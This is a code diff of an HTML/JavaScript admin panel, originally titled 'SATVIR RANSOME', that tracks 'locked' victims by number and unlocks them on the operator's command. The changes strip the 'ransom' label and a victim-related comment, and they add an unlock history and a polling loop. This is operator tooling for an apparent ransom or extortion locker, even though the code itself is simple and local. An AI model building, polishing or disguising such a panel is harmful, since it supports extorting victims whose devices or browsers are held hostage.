@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>👑 Admin Panel - SATVIR RANSOME</title>
+    <title>👑 Admin Panel - SATVIR</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -57,7 +57,6 @@
             text-align: center;
             margin-top: 15px;
             font-size: 14px;
-            color: #ff8888;
         }
         .status.success { color: #4caf50; }
         .status.error { color: #f44336; }
@@ -85,6 +84,12 @@
         }
         .user-item .num { font-family: monospace; color: #ff9800; }
         .user-item .status-badge { color: #ff4444; font-size: 11px; }
+        .unlock-history {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -103,10 +108,12 @@
             </div>
         </div>
 
-        <div class="footer">👑 Owner: @notxsatvir</div>
+        <div class="unlock-history" id="unlockHistory"></div>
+
+        <div class="footer">👑 Owner: <a href="https://t.me/notxsatvir" style="color:#ff6666; text-decoration:none;">@notxsatvir</a></div>
     </div>
     <script>
-        // Get locked users from localStorage
+        // ========== FUNCTIONS ==========
         function getLockedUsers() {
             return JSON.parse(localStorage.getItem('satvir_locked_users') || '[]');
         }
@@ -115,7 +122,14 @@
             localStorage.setItem('satvir_locked_users', JSON.stringify(users));
         }
 
-        // Add current user if not exists
+        function getUnlockHistory() {
+            return JSON.parse(localStorage.getItem('satvir_unlock_history') || '[]');
+        }
+
+        function saveUnlockHistory(history) {
+            localStorage.setItem('satvir_unlock_history', JSON.stringify(history));
+        }
+
         function addCurrentUser() {
             const number = localStorage.getItem('satvir_ransom_number');
             if (!number) return;
@@ -126,7 +140,6 @@
             }
         }
 
-        // Render user list
         function renderUsers() {
             const users = getLockedUsers();
             const container = document.getElementById('userList');
@@ -142,7 +155,18 @@
             `).join('');
         }
 
-        // Unlock user
+        function renderHistory() {
+            const history = getUnlockHistory();
+            const container = document.getElementById('unlockHistory');
+            if (history.length === 0) {
+                container.textContent = '';
+                return;
+            }
+            const last = history.slice(-5);
+            container.innerHTML = '📜 Recent Unlocks: ' + last.join(', ');
+        }
+
+        // ========== UNLOCK ==========
         document.getElementById('unlockBtn').addEventListener('click', function() {
             const num = document.getElementById('unlockNumber').value.trim();
             const status = document.getElementById('status');
@@ -157,41 +181,60 @@
             if (users.includes(num)) {
                 users = users.filter(u => u !== num);
                 saveLockedUsers(users);
+                localStorage.setItem('satvir_unlock_' + num, 'true');
+
+                // Save history
+                let history = getUnlockHistory();
+                history.push(num);
+                if (history.length > 10) history.shift();
+                saveUnlockHistory(history);
+
                 status.className = 'status success';
                 status.textContent = `✅ User ${num} unlocked successfully!`;
                 renderUsers();
+                renderHistory();
                 document.getElementById('unlockNumber').value = '';
-                // Store unlock command for victim
-                localStorage.setItem('satvir_unlock_' + num, 'true');
+
+                // Auto clear after 3 seconds
+                setTimeout(() => {
+                    if (status.textContent.includes('unlocked')) {
+                        status.textContent = '';
+                        status.className = 'status';
+                    }
+                }, 3000);
             } else {
                 status.className = 'status error';
                 status.textContent = '❌ User not found or already unlocked!';
+                setTimeout(() => {
+                    status.textContent = '';
+                    status.className = 'status';
+                }, 3000);
             }
-
-            setTimeout(() => { status.textContent = ''; }, 4000);
         });
 
-        // Check for unlock on victim side
-        function checkUnlock() {
+        // ========== ENTER KEY ==========
+        document.getElementById('unlockNumber').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('unlockBtn').click();
+            }
+        });
+
+        // ========== INIT ==========
+        addCurrentUser();
+        renderUsers();
+        renderHistory();
+
+        // Auto-check unlock status
+        setInterval(function() {
             const number = localStorage.getItem('satvir_ransom_number');
             if (number && localStorage.getItem('satvir_unlock_' + number) === 'true') {
                 localStorage.removeItem('satvir_unlock_' + number);
-                // Remove from locked list
                 let users = getLockedUsers();
                 users = users.filter(u => u !== number);
                 saveLockedUsers(users);
-                // Exit
-                window.close();
-                window.location.href = 'about:blank';
+                renderUsers();
             }
-        }
-
-        // Initialize
-        addCurrentUser();
-        renderUsers();
-
-        // Check unlock every 2 seconds
-        setInterval(checkUnlock, 2000);
+        }, 3000);
 
         console.log('👑 Admin Panel Loaded');
         console.log('🔑 Unlock users by entering their number');
